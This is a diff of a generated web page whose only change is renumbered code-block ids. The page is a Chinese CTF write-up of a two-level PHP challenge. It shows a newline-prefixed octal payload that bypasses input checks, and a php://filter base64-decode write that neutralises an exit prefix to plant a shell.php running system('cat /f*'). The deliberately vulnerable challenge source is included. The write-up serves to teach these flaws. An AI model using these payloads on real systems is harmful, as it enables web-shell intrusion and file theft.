@@ -3746,10 +3746,10 @@
 <p>两道关，一关传参数，一关写文件。</p>
 <p><strong>第一关（<code>index.php</code>）</strong>：一个 <code>num</code> 参数，四道检查，全过才给你 <code>$_SESSION['ezphp_level1']</code> 并跳到 <code>death.php</code>。</p>
 <p><strong>第二关（<code>death.php</code>）</strong>：要有第一关的 session，然后接收 <code>filename</code> 和 <code>content</code>，往文件里写：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="x">$written = @file_put_contents(</span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="x">    $filename,</span>
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="x">    "</span><span class="cp">&lt;?php</span> <span class="k">exit</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">" . $content</span>
-</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="x">);</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">$written = @file_put_contents(</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">    $filename,</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">    "</span><span class="cp">&lt;?php</span> <span class="k">exit</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">" . $content</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="x">);</span>
 </span></code></pre></div>
 <p><strong>两关的共同点：都在利用“同一段数据被两个东西读出两种含义”。</strong></p>
 <hr />
@@ -3794,74 +3794,74 @@
 </table>
 <h4 id="step-2"><a class="toclink" href="../../ezphp-two-levels/#step-2">Step 2：确定只剩八进制</a></h4>
 <p><code>intval($num, 0)</code> 第二个参数为 0，那么就看 <code>num</code> 的开头：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>0x 开头  →  16 进制     ✗ 字母 x 被 [a-z] 拦了
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>0b 开头  →  2 进制      ✗ 字母 b 被拦了
-</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>0 开头   →  8 进制      ✓ 纯数字，只剩这条
-</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>其他     →  10 进制     ✗ 十进制真值会等于 411413，被第一道 `==` 拦
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>0x 开头  →  16 进制     ✗ 字母 x 被 [a-z] 拦了
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>0b 开头  →  2 进制      ✗ 字母 b 被拦了
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>0 开头   →  8 进制      ✓ 纯数字，只剩这条
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>其他     →  10 进制     ✗ 十进制真值会等于 411413，被第一道 `==` 拦
 </span></code></pre></div>
 <p><strong>所以这里只能用 8 进制。</strong></p>
 <h4 id="step-3-0"><a class="toclink" href="../../ezphp-two-levels/#step-3-0">Step 3：但 <code>0</code> 不能是第一个 —— 用换行符</a></h4>
 <p>八进制必须以 <code>0</code> 开头，可 <code>strpos</code> 那道又不许 <code>0</code> 在第 0 位。</p>
 <p><strong>关键在于：<code>intval</code> 会跳过前导空白，而 <code>strpos</code> 不会跳过任何东西 —— 它只是找下标。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>strpos("01443425","0")  = 0   → !0 = true  → 死
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>strpos("\n01443425","0") = 1  → !1 = false → 活
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>intval("\n01443425", 0)  = 411413          → 值对
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>strpos("01443425","0")  = 0   → !0 = true  → 死
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>strpos("\n01443425","0") = 1  → !1 = false → 活
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>intval("\n01443425", 0)  = 411413          → 值对
 </span></code></pre></div>
 <p><strong>所以选择用 <code>%0A</code>（换行符）当第一个就可以了。</strong></p>
 <h4 id="step-4"><a class="toclink" href="../../ezphp-two-levels/#step-4">Step 4：算数字</a></h4>
 <p><strong>别手算，用 PHP 算：</strong></p>
 <p><img alt="用 base_convert 算八进制" src="../../../assets/images/ezphp-two-levels/01-octal-calc.png" /></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">php</span> <span class="n">-r</span> <span class="s2">"echo base_convert('411413', 10, 8);"</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">php</span> <span class="n">-r</span> <span class="s2">"echo base_convert('411413', 10, 8);"</span>
 </span></code></pre></div>
 <p>得到 <code>1443425</code>，前面补 <code>0</code> 就是 <code>01443425</code>。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>payload：?num=%0A01443425
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>payload：?num=%0A01443425
 </span></code></pre></div>
 <p><strong>⚠️ 数字必须完整。</strong> 少一位（比如写成 <code>0144325</code>）<code>intval</code> 会得到 <code>51413</code>，差得非常远。</p>
 <h4 id="step-5php-exit"><a class="toclink" href="../../ezphp-two-levels/#step-5php-exit">Step 5：第二关，<code>&lt;?php exit;?&gt;</code> 是“前缀死刑”</a></h4>
 <p>进来之后源码就很明晰了：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="x">$written = @file_put_contents(</span>
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="x">    $filename,</span>
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="x">    "</span><span class="cp">&lt;?php</span> <span class="k">exit</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">" . $content</span>
-</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="x">);</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="x">$written = @file_put_contents(</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="x">    $filename,</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="x">    "</span><span class="cp">&lt;?php</span> <span class="k">exit</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">" . $content</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="x">);</span>
 </span></code></pre></div>
 <p><strong>写出来的文件是这样的：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="cp">&lt;?php</span> <span class="k">exit</span><span class="p">;</span><span class="cp">?&gt;&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'cat /f*'</span><span class="p">);</span><span class="cp">?&gt;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cp">&lt;?php</span> <span class="k">exit</span><span class="p">;</span><span class="cp">?&gt;&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'cat /f*'</span><span class="p">);</span><span class="cp">?&gt;</span>
 </span></code></pre></div>
 <p><strong><code>exit;</code> 会在你的代码之前执行，整个请求立刻结束 —— 后面那段永远到不了。</strong></p>
 <p><strong>它不删你的代码，只是让你的代码排不上队。</strong></p>
 <h4 id="step-6-filename-content"><a class="toclink" href="../../ezphp-two-levels/#step-6-filename-content">Step 6：要改的是 <code>filename</code>，不是 <code>content</code></a></h4>
 <p><strong><code>file_put_contents</code> 的第一个参数是</strong>文件名<strong>，而 PHP 的文件名支持流包装器。</strong>所以我能控制的不只是“写到哪”，还有“写入途中经过什么处理”：**</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>php://filter/write=&lt;滤镜&gt;/resource=&lt;真实路径&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>php://filter/write=&lt;滤镜&gt;/resource=&lt;真实路径&gt;
 </span></code></pre></div>
 <p><strong>这就是这题的突破口 —— 问题不在 <code>content</code> 装不进去，而在</strong>写入通道可以被编程<strong>。</strong></p>
 <h4 id="step-7convertbase64-decode"><a class="toclink" href="../../ezphp-two-levels/#step-7convertbase64-decode">Step 7：<code>convert.base64-decode</code> 把前缀变成乱码</a></h4>
 <p><strong>用 <code>convert.base64-decode</code>，数据在落盘前会先做一次 base64 解码。而 base64 解码器的规则是：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>① 只认 [A-Za-z0-9+/=]
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>② 其他字符（&lt; ? 空格 ; &gt;）直接丢掉
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>③ 剩下的每 4 个字符 → 3 字节
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>① 只认 [A-Za-z0-9+/=]
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>② 其他字符（&lt; ? 空格 ; &gt;）直接丢掉
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>③ 剩下的每 4 个字符 → 3 字节
 </span></code></pre></div>
 <p><strong><code>&lt;?php exit;?&gt;</code> 里能留下的只有 <code>phpexit</code> —— 7 个字母：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>[&lt;] 丢弃   [?] 丢弃   [p] 留下   [h] 留下   [p] 留下
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>[ ] 丢弃   [e] 留下   [x] 留下   [i] 留下   [t] 留下
-</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>[;] 丢弃   [?] 丢弃   [&gt;] 丢弃
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>[&lt;] 丢弃   [?] 丢弃   [p] 留下   [h] 留下   [p] 留下
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>[ ] 丢弃   [e] 留下   [x] 留下   [i] 留下   [t] 留下
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>[;] 丢弃   [?] 丢弃   [&gt;] 丢弃
 </span></code></pre></div>
 <p><strong>留下的 7 个字母会被当成数据解码，变成 6 个乱码字节。</strong></p>
 <p><strong>最终文件变成：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>[6 字节乱码] + [我们自己的 PHP 代码]
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>[6 字节乱码] + [我们自己的 PHP 代码]
 </span></code></pre></div>
 <p><strong>乱码里没有 <code>&lt;</code>，所以 PHP 不会在那里进入代码模式，只是把它当普通字节输出（页面顶部那几个怪字符）；后面我们自己的 <code>&lt;?php</code> 才是第一个被识别的开标签。</strong></p>
 <h4 id="step-8"><a class="toclink" href="../../ezphp-two-levels/#step-8">Step 8：必须补字符对齐</a></h4>
 <p><strong>base64 解码要求有效字符数是 4 的倍数。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>7（phpexit）+ 补充字符数 + base64 长度  必须 % 4 == 0
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>7 + 1 + 32 = 40  ✅
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>7 + 5 + 32 = 44  ✅   加 5 个凑成 12 也行
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>7（phpexit）+ 补充字符数 + base64 长度  必须 % 4 == 0
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>7 + 1 + 32 = 40  ✅
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>7 + 5 + 32 = 44  ✅   加 5 个凑成 12 也行
 </span></code></pre></div>
 <p><strong>不足 4 的倍数，滤镜会报 <code>invalid byte sequence</code>，写入直接失败。</strong></p>
 <p><strong>所以要在 base64 前面补 1 个字符（或 5 个），跟前面的 7 个凑成 8（或 12）。</strong></p>
 <h4 id="step-9-content"><a class="toclink" href="../../ezphp-two-levels/#step-9-content">Step 9：把 <code>content=</code> 也编码进去 —— 我踩的第一个坑</a></h4>
 <p><strong>这里我最开始不知道在干嘛，把 <code>content=</code> 也放进去编码了，查询时一直报错，太迷了。</strong></p>
 <p><strong><code>content</code> 是</strong>字段名<strong>，必须原样出现在 body 里，不能被编码：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>content=&lt;1 个对齐字符&gt;&lt;只含 &lt;?php ... ?&gt; 的 base64&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>content=&lt;1 个对齐字符&gt;&lt;只含 &lt;?php ... ?&gt; 的 base64&gt;
 </span></code></pre></div>
 <p><strong>如果把整段 <code>content=&lt;?php ...?&gt;</code> 都编码了，PHP 解析出来的键就是那一长串 base64，<code>$_POST['content']</code> 根本不存在 —— 后端第一句 <code>isset</code> 就 <code>exit</code> 了，页面一片空白。</strong></p>
 <h4 id="step-10"><a class="toclink" href="../../ezphp-two-levels/#step-10">Step 10：尾部 <code>=</code> 和 <code>+</code> 的坑</a></h4>
@@ -3894,33 +3894,33 @@
 <p><strong>顺带说：PHP 文件本来就不需要 <code>?&gt;</code> 结尾，官方也建议省略 —— 这一刀砍得对。</strong></p>
 <h4 id="step-11-flag"><a class="toclink" href="../../ezphp-two-levels/#step-11-flag">Step 11：拼起来拿 flag</a></h4>
 <p><img alt="请求体" src="../../../assets/images/ezphp-two-levels/02-request-body.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>GET   ?filename=php://filter/write=convert.base64-decode/resource=shell.php
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>POST  content=A&lt;去掉 ?&gt; 的 base64&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>GET   ?filename=php://filter/write=convert.base64-decode/resource=shell.php
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>POST  content=A&lt;去掉 ?&gt; 的 base64&gt;
 </span></code></pre></div>
 <p><strong>访问 <code>shell.php</code>：</strong></p>
 <p><img alt="拿到 flag" src="../../../assets/images/ezphp-two-levels/03-flag.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>SYC{Y0u_have_alr3ady_g0tten_started_w1th_PHP}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>SYC{Y0u_have_alr3ady_g0tten_started_w1th_PHP}
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../ezphp-two-levels/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>第一关：
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>  四道检查互斥
-</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>    → 字母全禁 → 只剩八进制（0x / 0b 都要字母）
-</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>      → 但 strpos 不许 0 在第 0 位
-</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>        → 用换行符占位：intval 跳过它，strpos 数它
-</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>          → 算 411413 的八进制，拼起来，进 session
-</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>
-</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>第二关：
-</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>  file_put_contents 的 filename 可控 → 能挂流包装器
-</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>    → 前缀 &lt;?php exit;?&gt; 会先执行 → 必须毁掉它
-</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a>      → convert.base64-decode：非字母表字符全丢，字母被解码成乱码
-</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a>        → 7 个字母 + 补 1 个对齐 → 前缀变成 6 字节乱码
-</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a>          → 文件 = 乱码 + 我们的 shell → 执行 → flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>第一关：
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>  四道检查互斥
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>    → 字母全禁 → 只剩八进制（0x / 0b 都要字母）
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>      → 但 strpos 不许 0 在第 0 位
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>        → 用换行符占位：intval 跳过它，strpos 数它
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>          → 算 411413 的八进制，拼起来，进 session
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>第二关：
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>  file_put_contents 的 filename 可控 → 能挂流包装器
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>    → 前缀 &lt;?php exit;?&gt; 会先执行 → 必须毁掉它
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>      → convert.base64-decode：非字母表字符全丢，字母被解码成乱码
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>        → 7 个字母 + 补 1 个对齐 → 前缀变成 6 字节乱码
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>          → 文件 = 乱码 + 我们的 shell → 执行 → flag
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../ezphp-two-levels/#_4">漏洞原理</a></h4>
 <p><strong>① 同一个字符串，两个函数读出两种含义</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>intval($num, 0)   看"值"：跳过前导空白，按第一个字符定进制
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>strpos($num, "0") 看"位置"：不解析，只找下标
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>intval($num, 0)   看"值"：跳过前导空白，按第一个字符定进制
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>strpos($num, "0") 看"位置"：不解析，只找下标
 </span></code></pre></div>
 <p><strong><code>"\n01443425"</code> 对前者是 411413，对后者是"0 出现在第 1 位"。两个结论都成立，检查就被夹在中间。</strong></p>
 <p><strong>② 写入通道可编程</strong></p>
@@ -3977,80 +3977,80 @@
 <hr />
 <details class="note">
 <summary>第一关源码</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="nb">ob_start</span><span class="p">();</span>
-</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="nb">session_start</span><span class="p">();</span>
-</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>
-</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="k">include</span><span class="p">(</span><span class="s2">"flag.php"</span><span class="p">);</span>
-</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>
-</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'num'</span><span class="p">]))</span> <span class="p">{</span>
-</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>    <span class="k">exit</span><span class="p">;</span>
-</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a><span class="p">}</span>
-</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>
-</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a><span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'num'</span><span class="p">];</span>
-</span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a>
-</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$num</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-36-15"><a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"xiexie 不喜欢数组。"</span><span class="p">);</span>
-</span><span id="__span-36-16"><a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a><span class="p">}</span>
-</span><span id="__span-36-17"><a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a>
-</span><span id="__span-36-18"><a id="__codelineno-36-18" name="__codelineno-36-18" href="#__codelineno-36-18"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$num</span> <span class="o">==</span> <span class="mi">411413</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-36-19"><a id="__codelineno-36-19" name="__codelineno-36-19" href="#__codelineno-36-19"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"这都无法做到吗!"</span><span class="p">);</span>
-</span><span id="__span-36-20"><a id="__codelineno-36-20" name="__codelineno-36-20" href="#__codelineno-36-20"></a><span class="p">}</span>
-</span><span id="__span-36-21"><a id="__codelineno-36-21" name="__codelineno-36-21" href="#__codelineno-36-21"></a>
-</span><span id="__span-36-22"><a id="__codelineno-36-22" name="__codelineno-36-22" href="#__codelineno-36-22"></a><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[a-z\.]/i"</span><span class="p">,</span> <span class="nv">$num</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-36-23"><a id="__codelineno-36-23" name="__codelineno-36-23" href="#__codelineno-36-23"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"xiexie感觉你应该没办法了!!"</span><span class="p">);</span>
-</span><span id="__span-36-24"><a id="__codelineno-36-24" name="__codelineno-36-24" href="#__codelineno-36-24"></a><span class="p">}</span>
-</span><span id="__span-36-25"><a id="__codelineno-36-25" name="__codelineno-36-25" href="#__codelineno-36-25"></a>
-</span><span id="__span-36-26"><a id="__codelineno-36-26" name="__codelineno-36-26" href="#__codelineno-36-26"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="s2">"0"</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-36-27"><a id="__codelineno-36-27" name="__codelineno-36-27" href="#__codelineno-36-27"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"玉米说以防万一再试试这个!!!"</span><span class="p">);</span>
-</span><span id="__span-36-28"><a id="__codelineno-36-28" name="__codelineno-36-28" href="#__codelineno-36-28"></a><span class="p">}</span>
-</span><span id="__span-36-29"><a id="__codelineno-36-29" name="__codelineno-36-29" href="#__codelineno-36-29"></a>
-</span><span id="__span-36-30"><a id="__codelineno-36-30" name="__codelineno-36-30" href="#__codelineno-36-30"></a><span class="k">if</span> <span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">===</span> <span class="mi">411413</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-36-31"><a id="__codelineno-36-31" name="__codelineno-36-31" href="#__codelineno-36-31"></a>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'ezphp_level1'</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
-</span><span id="__span-36-32"><a id="__codelineno-36-32" name="__codelineno-36-32" href="#__codelineno-36-32"></a>    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: death.php"</span><span class="p">);</span>
